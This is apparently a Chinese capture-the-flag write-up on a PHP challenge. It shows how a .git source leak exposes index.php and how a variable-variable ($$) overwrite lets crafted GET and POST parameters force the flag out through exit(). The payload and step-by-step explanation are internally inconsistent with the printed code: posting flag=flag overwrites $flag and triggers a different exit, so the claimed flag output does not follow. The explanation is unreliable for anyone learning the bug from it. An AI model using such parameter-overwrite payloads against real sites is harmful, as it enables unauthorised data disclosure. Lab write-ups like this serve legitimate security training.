知识点：

1. .git源码泄露

2. $$变量覆盖



# 1.扫描发现存在.git源码泄露

index.php

```javascript
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';


foreach($_POST as $x => $y){
    $$x = $y;
//    $flag=fla
}

foreach($_GET as $x => $y){
    $$x = $$y;
//    $flag=$fla
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}



//上面的代码不退出则输出flag
echo "the flag is: ".$flag;
```



flag.php

```javascript
<?php

$flag = file_get_contents('/flag');
```



# 2. 发现index.php存在变量覆盖

我们需要绕过，前面的exit限制



## 注意：



## 这个题，最后一句echo输出不了flag，我们只能利用exit()终止时抛出flag.

## 所以我们的目的是：

## 将$yds.$is,$handsome中的一个覆盖，并通过exit()抛出



# 3.paylaod

```javascript
GET:yds=flag
POST:flag=flag
```



## 3.1 首先我们post：$flag=flag

```javascript
foreach($_POST as $x => $y){  //$x=$flag,$y=flag
    $$x = $y;                 //$flag=flag
}
```

这样就变成了$$flag = flag。$$x表示$$flag，被$y赋值后为flag



## 3.2 接下来GET：?yds=flag

```javascript
foreach($_GET as $x => $y){  //$x=yds,$y=flag
    $$x = $$y;              //$yds=$flag 
}
```



$flag就是真正的flag{XXXXXX}。

$$x = $$y，也就是$yds=flag{XXXXXX}。



## 3.3 此时没有_GET[flag]不满足，抛出$yds=$flag

```javascript
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}
```



所以会输出flag。总的来说还是挺绕的。。



